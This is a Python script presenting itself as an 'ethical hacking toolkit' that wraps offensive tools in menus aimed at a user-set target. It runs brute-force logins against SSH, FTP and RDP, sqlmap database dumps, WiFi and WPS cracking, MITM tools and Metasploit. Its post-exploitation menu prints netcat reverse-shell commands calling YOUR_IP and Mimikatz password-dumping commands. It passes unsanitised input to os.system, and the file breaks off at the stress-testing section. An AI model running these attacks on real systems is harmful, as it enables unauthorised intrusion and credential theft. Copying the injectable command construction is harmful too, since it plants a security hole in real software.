#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
All-in-One Ethical Hacking Toolkit
Author: Security Researcher
For Educational Purposes Only
"""

import os
import sys
import time
import subprocess
import platform
from datetime import datetime
import signal
import readline
import argparse

# Colors for output
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

class EthicalHackingToolkit:
    def __init__(self):
        self.version = "2.0"
        self.author = "Security Researcher"
        self.log_file = "toolkit_log.txt"
        self.target = ""
        self.output_dir = "output"
        self.create_output_dir()
        
    def create_output_dir(self):
        """Create output directory if it doesn't exist"""
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)
            
    def log_action(self, action, status="SUCCESS"):
        """Log all actions to file"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(self.log_file, "a") as f:
            f.write(f"[{timestamp}] [{status}] {action}\n")
            
    def check_root(self):
        """Check if script is running as root"""
        if os.geteuid() != 0:
            print(f"{Colors.RED}[!] This script must be run as root!{Colors.END}")
            print(f"{Colors.YELLOW}[*] Try: sudo python3 app.py{Colors.END}")
            sys.exit(1)
            
    def check_tool(self, tool_name):
        """Check if a tool is installed"""
        try:
            subprocess.run([tool_name, "--version"], 
                         stdout=subprocess.DEVNULL, 
                         stderr=subprocess.DEVNULL)
            return True
        except:
            return False
            
    def install_tools(self):
        """Install all required tools"""
        print(f"{Colors.YELLOW}[*] Installing required tools...{Colors.END}")
        
        tools = [
            "nmap", "hydra", "john", "netcat", "sqlmap", 
            "wireshark", "aircrack-ng", "metasploit-framework",
            "nikto", "wpscan", "dirb", "dnsrecon", "whatweb",
            "skipfish", "theharvester", "enum4linux", "smbclient",
            "fcrackzip", "hashcat", "medusa", "crunch"
        ]
        
        # Update package list
        os.system("apt-get update -y")
        
        # Install tools
        for tool in tools:
            print(f"{Colors.BLUE}[*] Installing {tool}...{Colors.END}")
            os.system(f"apt-get install -y {tool}")
            
        # Install Python packages
        python_packages = ["requests", "scapy", "paramiko", "colorama"]
        for package in python_packages:
            os.system(f"pip3 install {package}")
            
        print(f"{Colors.GREEN}[+] All tools installed successfully!{Colors.END}")
        
    def show_banner(self):
        """Display awesome banner"""
        os.system("clear" if os.name == "posix" else "cls")
        banner = f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════╗
║{Colors.YELLOW}   AAA   L     L         I   N   N  OOO  N   N  EEEEE  {Colors.RED}║
║{Colors.YELLOW}  A   A  L     L         I   NN  N O   O NN  N  E      {Colors.RED}║
║{Colors.YELLOW}  AAAAA  L     L         I   N N N O   O N N N  EEEE   {Colors.RED}║
║{Colors.YELLOW}  A   A  L     L         I   N  NN O   O N  NN  E      {Colors.RED}║
║{Colors.YELLOW}  A   A  LLLLL LLLLL     I   N   N  OOO  N   N  EEEEE  {Colors.RED}║
╠═══════════════════════════════════════════════════════════════╣
║{Colors.GREEN}        Ethical Hacking Toolkit v{self.version} - 20+ Tools{Colors.RED}         ║
║{Colors.CYAN}           Author: {self.author} - For Educational Use{Colors.RED}         ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """
        print(banner)
        
    def show_menu(self):
        """Display main menu"""
        menu = f"""
{Colors.BOLD}{Colors.CYAN}[ MAIN MENU ]{Colors.END}

{Colors.GREEN}[1]{Colors.END}  Information Gathering
{Colors.GREEN}[2]{Colors.END}  Vulnerability Analysis
{Colors.GREEN}[3]{Colors.END}  Web Application Testing
{Colors.GREEN}[4]{Colors.END}  Password Attacks
{Colors.GREEN}[5]{Colors.END}  Wireless Attacks
{Colors.GREEN}[6]{Colors.END}  Exploitation Tools
{Colors.GREEN}[7]{Colors.END}  Sniffing & Spoofing
{Colors.GREEN}[8]{Colors.END}  Post Exploitation
{Colors.GREEN}[9]{Colors.END}  Forensics Tools
{Colors.GREEN}[10]{Colors.END} Database Assessment
{Colors.GREEN}[11]{Colors.END} Stress Testing
{Colors.GREEN}[12]{Colors.END} Reporting Tools
{Colors.GREEN}[13]{Colors.END} Update Toolkit
{Colors.GREEN}[14]{Colors.END} Install All Tools
{Colors.GREEN}[0]{Colors.END}  Exit

{Colors.YELLOW}[*] Target: {self.target or 'Not Set'}{Colors.END}
        """
        print(menu)
        
    def set_target(self):
        """Set target IP/Domain"""
        self.target = input(f"{Colors.BLUE}[?] Enter target IP/Domain: {Colors.END}")
        print(f"{Colors.GREEN}[+] Target set to: {self.target}{Colors.END}")
        self.log_action(f"Target set: {self.target}")
        
    # ============= INFORMATION GATHERING =============
    def info_gathering_menu(self):
        """Information Gathering Submenu"""
        while True:
            os.system("clear" if os.name == "posix" else "cls")
            print(f"{Colors.BOLD}{Colors.CYAN}[ INFORMATION GATHERING ]{Colors.END}\n")
            print(f"{Colors.GREEN}[1]{Colors.END} Nmap - Port Scanner")
            print(f"{Colors.GREEN}[2]{Colors.END} theHarvester - Email/Subdomain Enum")
            print(f"{Colors.GREEN}[3]{Colors.END} DNSrecon - DNS Enumeration")
            print(f"{Colors.GREEN}[4]{Colors.END} WhatWeb - Web Tech Detector")
            print(f"{Colors.GREEN}[5]{Colors.END} enum4linux - Windows/Linux Enum")
            print(f"{Colors.GREEN}[6]{Colors.END} Netcat - Banner Grabbing")
            print(f"{Colors.GREEN}[7]{Colors.END} dnsenum - DNS Info")
            print(f"{Colors.GREEN}[8]{Colors.END} fierce - DNS Scanner")
            print(f"{Colors.GREEN}[9]{Colors.END} Back to Main Menu")
            
            choice = input(f"\n{Colors.BLUE}[?] Select option: {Colors.END}")
            
            if choice == "1":
                self.nmap_scan()
            elif choice == "2":
                self.theharvester_scan()
            elif choice == "3":
                self.dnsrecon_scan()
            elif choice == "4":
                self.whatweb_scan()
            elif choice == "5":
                self.enum4linux_scan()
            elif choice == "6":
                self.netcat_banner()
            elif choice == "7":
                self.dnsenum_scan()
            elif choice == "8":
                self.fierce_scan()
            elif choice == "9":
                break
                
    def nmap_scan(self):
        """Run Nmap scan"""
        print(f"{Colors.YELLOW}[*] Nmap Scan{Colors.END}")
        print(f"\n{Colors.CYAN}1. Quick Scan")
        print("2. Full Port Scan")
        print("3. Service Version Detection")
        print("4. OS Detection")
        print("5. Custom Command{Colors.END}")
        
        scan_type = input(f"\n{Colors.BLUE}[?] Select scan type: {Colors.END}")
        
        if scan_type == "1":
            cmd = f"nmap -T4 -F {self.target}"
        elif scan_type == "2":
            cmd = f"nmap -p- {self.target}"
        elif scan_type == "3":
            cmd = f"nmap -sV {self.target}"
        elif scan_type == "4":
            cmd = f"nmap -O {self.target}"
        elif scan_type == "5":
            cmd = input(f"{Colors.BLUE}[?] Enter Nmap command: {Colors.END}")
        else:
            return
            
        output_file = f"{self.output_dir}/nmap_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        cmd += f" -oN {output_file}"
        
        print(f"{Colors.YELLOW}[*] Running: {cmd}{Colors.END}")
        os.system(cmd)
        print(f"{Colors.GREEN}[+] Results saved to: {output_file}{Colors.END}")
        input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.END}")
        
    def theharvester_scan(self):
        """Run theHarvester"""
        sources = input(f"{Colors.BLUE}[?] Enter sources (google,bing,linkedin): {Colors.END}")
        cmd = f"theharvester -d {self.target} -b {sources}"
        output_file = f"{self.output_dir}/theharvester_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        cmd += f" -f {output_file}"
        
        print(f"{Colors.YELLOW}[*] Running theHarvester...{Colors.END}")
        os.system(cmd)
        input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.END}")
        
    def dnsrecon_scan(self):
        """Run DNSrecon"""
        print(f"{Colors.YELLOW}[*] DNS Enumeration{Colors.END}")
        cmd = f"dnsrecon -d {self.target} -t std,brt"
        output_file = f"{self.output_dir}/dnsrecon_{datetime.now().strftime('%Y%m%d_%H%M%S')}.xml"
        cmd += f" --xml {output_file}"
        
        os.system(cmd)
        input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.END}")
        
    def whatweb_scan(self):
        """Run WhatWeb"""
        cmd = f"whatweb -v {self.target}"
        os.system(cmd)
        input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.END}")
        
    def enum4linux_scan(self):
        """Run enum4linux"""
        cmd = f"enum4linux -a {self.target}"
        os.system(cmd)
        input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.END}")
        
    def netcat_banner(self):
        """Netcat banner grabbing"""
        port = input(f"{Colors.BLUE}[?] Enter port: {Colors.END}")
        cmd = f"nc -nv {self.target} {port}"
        print(f"{Colors.YELLOW}[*] Grabbing banner...{Colors.END}")
        os.system(cmd)
        input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.END}")
        
    def dnsenum_scan(self):
        """Run dnsenum"""
        cmd = f"dnsenum {self.target}"
        os.system(cmd)
        input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.END}")
        
    def fierce_scan(self):
        """Run fierce"""
        cmd = f"fierce -dns {self.target}"
        os.system(cmd)
        input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.END}")
        
    # ============= VULNERABILITY ANALYSIS =============
    def vuln_analysis_menu(self):
        """Vulnerability Analysis Submenu"""
        while True:
            os.system("clear" if os.name == "posix" else "cls")
            print(f"{Colors.BOLD}{Colors.CYAN}[ VULNERABILITY ANALYSIS ]{Colors.END}\n")
            print(f"{Colors.GREEN}[1]{Colors.END} Nikto - Web Scanner")
            print(f"{Colors.GREEN}[2]{Colors.END} WPScan - WordPress Scanner")
            print(f"{Colors.GREEN}[3]{Colors.END} Skipfish - Web App Scanner")
            print(f"{Colors.GREEN}[4]{Colors.END} CMSmap - CMS Scanner")
            print(f"{Colors.GREEN}[5]{Colors.END} JoomScan - Joomla Scanner")
            print(f"{Colors.GREEN}[6]{Colors.END} Back to Main Menu")
            
            choice = input(f"\n{Colors.BLUE}[?] Select option: {Colors.END}")
            
            if choice == "1":
                self.nikto_scan()
            elif choice == "2":
                self.wpscan_scan()
            elif choice == "3":
                self.skipfish_scan()
            elif choice == "4":
                self.cmsmap_scan()
            elif choice == "5":
                self.joomscan_scan()
            elif choice == "6":
                break
                
    def nikto_scan(self):
        """Run Nikto scanner"""
        cmd = f"nikto -h {self.target}"
        output_file = f"{self.output_dir}/nikto_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        cmd += f" -o {output_file}"
        
        print(f"{Colors.YELLOW}[*] Running Nikto scan...{Colors.END}")
        os.system(cmd)
        input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.END}")
        
    def wpscan_scan(self):
        """Run WPScan"""
        cmd = f"wpscan --url {self.target} -e vp,vt,dbe"
        output_file = f"{self.output_dir}/wpscan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        cmd += f" -o {output_file}"
        
        print(f"{Colors.YELLOW}[*] Running WPScan...{Colors.END}")
        os.system(cmd)
        input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.END}")
        
    def skipfish_scan(self):
        """Run Skipfish"""
        output_dir = f"{self.output_dir}/skipfish_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        cmd = f"skipfish -o {output_dir} {self.target}"
        
        print(f"{Colors.YELLOW}[*] Running Skipfish...{Colors.END}")
        os.system(cmd)
        print(f"{Colors.GREEN}[+] Results saved to: {output_dir}{Colors.END}")
        input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.END}")
        
    def cmsmap_scan(self):
        """Run CMSmap"""
        cmd = f"cmsmap {self.target}"
        os.system(cmd)
        input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.END}")
        
    def joomscan_scan(self):
        """Run JoomScan"""
        cmd = f"joomscan -u {self.target}"
        os.system(cmd)
        input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.END}")
        
    # ============= WEB APPLICATION TESTING =============
    def webapp_menu(self):
        """Web Application Testing Submenu"""
        while True:
            os.system("clear" if os.name == "posix" else "cls")
            print(f"{Colors.BOLD}{Colors.CYAN}[ WEB APPLICATION TESTING ]{Colors.END}\n")
            print(f"{Colors.GREEN}[1]{Colors.END} SQLMap - SQL Injection")
            print(f"{Colors.GREEN}[2]{Colors.END} Dirb - Directory Busting")
            print(f"{Colors.GREEN}[3]{Colors.END} Gobuster - Brute Force")
            print(f"{Colors.GREEN}[4]{Colors.END} WFuzz - Web Fuzzer")
            print(f"{Colors.GREEN}[5]{Colors.END} XSStrike - XSS Scanner")
            print(f"{Colors.GREEN}[6]{Colors.END} Back to Main Menu")
            
            choice = input(f"\n{Colors.BLUE}[?] Select option: {Colors.END}")
            
            if choice == "1":
                self.sqlmap_scan()
            elif choice == "2":
                self.dirb_scan()
            elif choice == "3":
                self.gobuster_scan()
            elif choice == "4":
                self.wfuzz_scan()
            elif choice == "5":
                self.xsstrike_scan()
            elif choice == "6":
                break
                
    def sqlmap_scan(self):
        """Run SQLMap"""
        url = input(f"{Colors.BLUE}[?] Enter full URL with parameter: {Colors.END}")
        print(f"\n{Colors.CYAN}1. Basic scan")
        print("2. Database enumeration")
        print("3. Tables enumeration")
        print("4. Dump data{Colors.END}")
        
        scan_type = input(f"\n{Colors.BLUE}[?] Select scan type: {Colors.END}")
        
        if scan_type == "1":
            cmd = f"sqlmap -u {url} --batch"
        elif scan_type == "2":
            cmd = f"sqlmap -u {url} --dbs --batch"
        elif scan_type == "3":
            db = input(f"{Colors.BLUE}[?] Enter database name: {Colors.END}")
            cmd = f"sqlmap -u {url} -D {db} --tables --batch"
        elif scan_type == "4":
            db = input(f"{Colors.BLUE}[?] Enter database name: {Colors.END}")
            table = input(f"{Colors.BLUE}[?] Enter table name: {Colors.END}")
            cmd = f"sqlmap -u {url} -D {db} -T {table} --dump --batch"
        else:
            return
            
        os.system(cmd)
        input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.END}")
        
    def dirb_scan(self):
        """Run Dirb"""
        cmd = f"dirb {self.target}"
        os.system(cmd)
        input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.END}")
        
    def gobuster_scan(self):
        """Run Gobuster"""
        wordlist = "/usr/share/wordlists/dirb/common.txt"
        cmd = f"gobuster dir -u {self.target} -w {wordlist}"
        os.system(cmd)
        input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.END}")
        
    def wfuzz_scan(self):
        """Run WFuzz"""
        wordlist = "/usr/share/wordlists/wfuzz/general/common.txt"
        cmd = f"wfuzz -c -z file,{wordlist} --hc 404 {self.target}/FUZZ"
        os.system(cmd)
        input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.END}")
        
    def xsstrike_scan(self):
        """Run XSStrike"""
        url = input(f"{Colors.BLUE}[?] Enter URL to test for XSS: {Colors.END}")
        cmd = f"python3 xsstrike.py -u {url}"
        os.system(cmd)
        input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.END}")
        
    # ============= PASSWORD ATTACKS =============
    def password_attacks_menu(self):
        """Password Attacks Submenu"""
        while True:
            os.system("clear" if os.name == "posix" else "cls")
            print(f"{Colors.BOLD}{Colors.CYAN}[ PASSWORD ATTACKS ]{Colors.END}\n")
            print(f"{Colors.GREEN}[1]{Colors.END} Hydra - Online Brute Force")
            print(f"{Colors.GREEN}[2]{Colors.END} John the Ripper - Hash Cracker")
            print(f"{Colors.GREEN}[3]{Colors.END} Hashcat - GPU Cracking")
            print(f"{Colors.GREEN}[4]{Colors.END} Crunch - Wordlist Generator")
            print(f"{Colors.GREEN}[5]{Colors.END} Medusa - Parallel Brute Force")
            print(f"{Colors.GREEN}[6]{Colors.END} Fcrackzip - ZIP Password")
            print(f"{Colors.GREEN}[7]{Colors.END} Back to Main Menu")
            
            choice = input(f"\n{Colors.BLUE}[?] Select option: {Colors.END}")
            
            if choice == "1":
                self.hydra_attack()
            elif choice == "2":
                self.john_attack()
            elif choice == "3":
                self.hashcat_attack()
            elif choice == "4":
                self.crunch_generate()
            elif choice == "5":
                self.medusa_attack()
            elif choice == "6":
                self.fcrackzip_attack()
            elif choice == "7":
                break
                
    def hydra_attack(self):
        """Run Hydra brute force"""
        print(f"{Colors.YELLOW}[*] Hydra - Online Password Attack{Colors.END}")
        print(f"\n{Colors.CYAN}1. SSH Attack")
        print("2. FTP Attack")
        print("3. HTTP POST Form")
        print("4. MySQL Attack")
        print("5. RDP Attack{Colors.END}")
        
        service = input(f"\n{Colors.BLUE}[?] Select service: {Colors.END}")
        userlist = input(f"{Colors.BLUE}[?] Path to username list: {Colors.END}")
        passlist = input(f"{Colors.BLUE}[?] Path to password list: {Colors.END}")
        
        if service == "1":
            cmd = f"hydra -L {userlist} -P {passlist} ssh://{self.target}"
        elif service == "2":
            cmd = f"hydra -L {userlist} -P {passlist} ftp://{self.target}"
        elif service == "3":
            form = input(f"{Colors.BLUE}[?] Enter form parameters: {Colors.END}")
            cmd = f"hydra -L {userlist} -P {passlist} {self.target} http-post-form '{form}'"
        elif service == "4":
            cmd = f"hydra -L {userlist} -P {passlist} mysql://{self.target}"
        elif service == "5":
            cmd = f"hydra -L {userlist} -P {passlist} rdp://{self.target}"
        else:
            return
            
        os.system(cmd)
        input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.END}")
        
    def john_attack(self):
        """Run John the Ripper"""
        hash_file = input(f"{Colors.BLUE}[?] Path to hash file: {Colors.END}")
        format_type = input(f"{Colors.BLUE}[?] Hash format (raw-md5, sha256, etc): {Colors.END}")
        
        cmd = f"john --format={format_type} {hash_file}"
        os.system(cmd)
        print(f"\n{Colors.GREEN}[+] Cracked passwords:{Colors.END}")
        os.system(f"john --show {hash_file}")
        input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.END}")
        
    def hashcat_attack(self):
        """Run Hashcat"""
        hash_file = input(f"{Colors.BLUE}[?] Path to hash file: {Colors.END}")
        print(f"\n{Colors.CYAN}Common hash modes:")
        print("0 - MD5")
        print("100 - SHA1")
        print("1400 - SHA256")
        print("1700 - SHA512{Colors.END}")
        
        mode = input(f"{Colors.BLUE}[?] Enter hash mode: {Colors.END}")
        wordlist = input(f"{Colors.BLUE}[?] Path to wordlist: {Colors.END}")
        
        cmd = f"hashcat -m {mode} -a 0 {hash_file} {wordlist}"
        os.system(cmd)
        input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.END}")
        
    def crunch_generate(self):
        """Generate wordlist with Crunch"""
        min_len = input(f"{Colors.BLUE}[?] Minimum length: {Colors.END}")
        max_len = input(f"{Colors.BLUE}[?] Maximum length: {Colors.END}")
        charset = input(f"{Colors.BLUE}[?] Character set (default: abcdefghijklmnopqrstuvwxyz): {Colors.END}")
        
        if not charset:
            charset = "abcdefghijklmnopqrstuvwxyz"
            
        output = f"{self.output_dir}/wordlist_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        cmd = f"crunch {min_len} {max_len} {charset} -o {output}"
        
        print(f"{Colors.YELLOW}[*] Generating wordlist...{Colors.END}")
        os.system(cmd)
        print(f"{Colors.GREEN}[+] Wordlist saved to: {output}{Colors.END}")
        input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.END}")
        
    def medusa_attack(self):
        """Run Medusa"""
        service = input(f"{Colors.BLUE}[?] Service (ssh/ftp/telnet): {Colors.END}")
        userlist = input(f"{Colors.BLUE}[?] Username list: {Colors.END}")
        passlist = input(f"{Colors.BLUE}[?] Password list: {Colors.END}")
        
        cmd = f"medusa -h {self.target} -U {userlist} -P {passlist} -M {service}"
        os.system(cmd)
        input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.END}")
        
    def fcrackzip_attack(self):
        """Crack ZIP password"""
        zip_file = input(f"{Colors.BLUE}[?] Path to ZIP file: {Colors.END}")
        wordlist = input(f"{Colors.BLUE}[?] Path to wordlist: {Colors.END}")
        
        cmd = f"fcrackzip -u -D -p {wordlist} {zip_file}"
        os.system(cmd)
        input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.END}")
        
    # ============= WIRELESS ATTACKS =============
    def wireless_menu(self):
        """Wireless Attacks Submenu"""
        while True:
            os.system("clear" if os.name == "posix" else "cls")
            print(f"{Colors.BOLD}{Colors.CYAN}[ WIRELESS ATTACKS ]{Colors.END}\n")
            print(f"{Colors.GREEN}[1]{Colors.END} Aircrack-ng - WiFi Audit")
            print(f"{Colors.GREEN}[2]{Colors.END} Reaver - WPS Attack")
            print(f"{Colors.GREEN}[3]{Colors.END} Kismet - Network Detector")
            print(f"{Colors.GREEN}[4]{Colors.END} Wifite - Automated WiFi Attack")
            print(f"{Colors.GREEN}[5]{Colors.END} Airgeddon - All-in-One WiFi")
            print(f"{Colors.GREEN}[6]{Colors.END} Back to Main Menu")
            
            choice = input(f"\n{Colors.BLUE}[?] Select option: {Colors.END}")
            
            if choice == "1":
                self.aircrack_menu()
            elif choice == "2":
                self.reaver_attack()
            elif choice == "3":
                self.kismet_scan()
            elif choice == "4":
                self.wifite_attack()
            elif choice == "5":
                self.airgeddon_attack()
            elif choice == "6":
                break
                
    def aircrack_menu(self):
        """Aircrack-ng submenu"""
        print(f"{Colors.YELLOW}[*] Aircrack-ng Suite{Colors.END}")
        print(f"\n{Colors.CYAN}1. Start monitor mode")
        print("2. Scan networks")
        print("3. Capture handshake")
        print("4. Crack handshake{Colors.END}")
        
        choice = input(f"\n{Colors.BLUE}[?] Select: {Colors.END}")
        
        if choice == "1":
            interface = input(f"{Colors.BLUE}[?] Wireless interface: {Colors.END}")
            os.system(f"airmon-ng start {interface}")
        elif choice == "2":
            os.system("airodump-ng wlan0mon")
        elif choice == "3":
            bssid = input(f"{Colors.BLUE}[?] Target BSSID: {Colors.END}")
            channel = input(f"{Colors.BLUE}[?] Channel: {Colors.END}")
            os.system(f"airodump-ng -c {channel} --bssid {bssid} -w capture wlan0mon")
        elif choice == "4":
            cap_file = input(f"{Colors.BLUE}[?] Capture file: {Colors.END}")
            wordlist = input(f"{Colors.BLUE}[?] Wordlist: {Colors.END}")
            os.system(f"aircrack-ng -w {wordlist} {cap_file}")
            
        input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.END}")
        
    def reaver_attack(self):
        """Reaver WPS attack"""
        interface = input(f"{Colors.BLUE}[?] Interface: {Colors.END}")
        bssid = input(f"{Colors.BLUE}[?] Target BSSID: {Colors.END}")
        
        cmd = f"reaver -i {interface} -b {bssid} -vv"
        os.system(cmd)
        input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.END}")
        
    def kismet_scan(self):
        """Run Kismet"""
        os.system("kismet")
        input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.END}")
        
    def wifite_attack(self):
        """Run Wifite"""
        os.system("wifite")
        input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.END}")
        
    def airgeddon_attack(self):
        """Run Airgeddon"""
        os.system("airgeddon")
        input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.END}")
        
    # ============= EXPLOITATION =============
    def exploitation_menu(self):
        """Exploitation Submenu"""
        while True:
            os.system("clear" if os.name == "posix" else "cls")
            print(f"{Colors.BOLD}{Colors.CYAN}[ EXPLOITATION TOOLS ]{Colors.END}\n")
            print(f"{Colors.GREEN}[1]{Colors.END} Metasploit Framework")
            print(f"{Colors.GREEN}[2]{Colors.END} Searchsploit")
            print(f"{Colors.GREEN}[3]{Colors.END} BeEF - Browser Exploitation")
            print(f"{Colors.GREEN}[4]{Colors.END} Social Engineering Toolkit")
            print(f"{Colors.GREEN}[5]{Colors.END} Commix - Command Injection")
            print(f"{Colors.GREEN}[6]{Colors.END} Back to Main Menu")
            
            choice = input(f"\n{Colors.BLUE}[?] Select option: {Colors.END}")
            
            if choice == "1":
                os.system("msfconsole")
            elif choice == "2":
                search_term = input(f"{Colors.BLUE}[?] Search term: {Colors.END}")
                os.system(f"searchsploit {search_term}")
            elif choice == "3":
                os.system("beef")
            elif choice == "4":
                os.system("setoolkit")
            elif choice == "5":
                url = input(f"{Colors.BLUE}[?] Target URL: {Colors.END}")
                os.system(f"commix --url={url}")
            elif choice == "6":
                break
                
            input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.END}")
            
    # ============= SNIFFING & SPOOFING =============
    def sniffing_menu(self):
        """Sniffing & Spoofing Submenu"""
        while True:
            os.system("clear" if os.name == "posix" else "cls")
            print(f"{Colors.BOLD}{Colors.CYAN}[ SNIFFING & SPOOFING ]{Colors.END}\n")
            print(f"{Colors.GREEN}[1]{Colors.END} Wireshark - Packet Analysis")
            print(f"{Colors.GREEN}[2]{Colors.END} Tcpdump - CLI Sniffer")
            print(f"{Colors.GREEN}[3]{Colors.END} Ettercap - MITM")
            print(f"{Colors.GREEN}[4]{Colors.END} Bettercap - Advanced MITM")
            print(f"{Colors.GREEN}[5]{Colors.END} Dsniff - Sniffing Suite")
            print(f"{Colors.GREEN}[6]{Colors.END} Back to Main Menu")
            
            choice = input(f"\n{Colors.BLUE}[?] Select option: {Colors.END}")
            
            if choice == "1":
                os.system("wireshark &")
            elif choice == "2":
                interface = input(f"{Colors.BLUE}[?] Interface: {Colors.END}")
                os.system(f"tcpdump -i {interface}")
            elif choice == "3":
                os.system("ettercap -G")
            elif choice == "4":
                os.system("bettercap")
            elif choice == "5":
                os.system("dsniff")
            elif choice == "6":
                break
                
            input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.END}")
            
    # ============= POST EXPLOITATION =============
    def post_exploitation_menu(self):
        """Post Exploitation Submenu"""
        while True:
            os.system("clear" if os.name == "posix" else "cls")
            print(f"{Colors.BOLD}{Colors.CYAN}[ POST EXPLOITATION ]{Colors.END}\n")
            print(f"{Colors.GREEN}[1]{Colors.END} Netcat Reverse Shell")
            print(f"{Colors.GREEN}[2]{Colors.END} PowerShell Empire")
            print(f"{Colors.GREEN}[3]{Colors.END} Mimikatz (Windows)")
            print(f"{Colors.GREEN}[4]{Colors.END} LinEnum - Linux Enum")
            print(f"{Colors.GREEN}[5]{Colors.END} Windows Exploit Suggester")
            print(f"{Colors.GREEN}[6]{Colors.END} Back to Main Menu")
            
            choice = input(f"\n{Colors.BLUE}[?] Select option: {Colors.END}")
            
            if choice == "1":
                print(f"\n{Colors.YELLOW}Reverse Shell Commands:{Colors.END}")
                print("Linux: nc -e /bin/sh YOUR_IP 4444")
                print("Windows: nc -e cmd.exe YOUR_IP 4444")
                print("Listener: nc -lvnp 4444")
            elif choice == "2":
                os.system("powershell-empire")
            elif choice == "3":
                print(f"{Colors.YELLOW}[*] Mimikatz commands:{Colors.END}")
                print("privilege::debug")
                print("sekurlsa::logonpasswords")
            elif choice == "4":
                os.system("wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")
            elif choice == "5":
                os.system("windows-exploit-suggester.py")
            elif choice == "6":
                break
                
            input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.END}")
            
    # ============= FORENSICS =============
    def forensics_menu(self):
        """Forensics Submenu"""
        while True:
            os.system("clear" if os.name == "posix" else "cls")
            print(f"{Colors.BOLD}{Colors.CYAN}[ FORENSICS TOOLS ]{Colors.END}\n")
            print(f"{Colors.GREEN}[1]{Colors.END} Foremost - File Recovery")
            print(f"{Colors.GREEN}[2]{Colors.END} Binwalk - Firmware Analysis")
            print(f"{Colors.GREEN}[3]{Colors.END} Autopsy - Digital Forensics")
            print(f"{Colors.GREEN}[4]{Colors.END} Volatility - Memory Forensics")
            print(f"{Colors.GREEN}[5]{Colors.END} Guymager - Disk Imaging")
            print(f"{Colors.GREEN}[6]{Colors.END} Back to Main Menu")
            
            choice = input(f"\n{Colors.BLUE}[?] Select option: {Colors.END}")
            
            if choice == "1":
                image_file = input(f"{Colors.BLUE}[?] Image file: {Colors.END}")
                os.system(f"foremost -i {image_file} -o {self.output_dir}/foremost")
            elif choice == "2":
                firmware = input(f"{Colors.BLUE}[?] Firmware file: {Colors.END}")
                os.system(f"binwalk {firmware}")
            elif choice == "3":
                os.system("autopsy")
            elif choice == "4":
                memory_file = input(f"{Colors.BLUE}[?] Memory dump: {Colors.END}")
                profile = input(f"{Colors.BLUE}[?] Profile (Win7SP1x64, etc): {Colors.END}")
                os.system(f"volatility -f {memory_file} --profile={profile} pslist")
            elif choice == "5":
                os.system("guymager")
            elif choice == "6":
                break
                
            input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.END}")
            
    # ============= DATABASE ASSESSMENT =============
    def database_menu(self):
        """Database Assessment Submenu"""
        while True:
            os.system("clear" if os.name == "posix" else "cls")
            print(f"{Colors.BOLD}{Colors.CYAN}[ DATABASE ASSESSMENT ]{Colors.END}\n")
            print(f"{Colors.GREEN}[1]{Colors.END} SQLMap (Advanced)")
            print(f"{Colors.GREEN}[2]{Colors.END} NoSQLMap - NoSQL Injection")
            print(f"{Colors.GREEN}[3]{Colors.END} MongoDB Scanner")
            print(f"{Colors.GREEN}[4]{Colors.END} MySQL Scanner")
            print(f"{Colors.GREEN}[5]{Colors.END} Back to Main Menu")
            
            choice = input(f"\n{Colors.BLUE}[?] Select option: {Colors.END}")
            
            if choice == "1":
                url = input(f"{Colors.BLUE}[?] URL: {Colors.END}")
                os.system(f"sqlmap -u {url} --dbs --random-agent")
            elif choice == "2":
                os.system("nosqlmap")
            elif choice == "3":
                os.system(f"nmap -p 27017 --script mongodb-info {self.target}")
            elif choice == "4":
                os.system(f"nmap -p 3306 --script mysql-* {self.target}")
            elif choice == "5":
                break
                
            input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.END}")
            
    # ============= STRESS TESTING =============
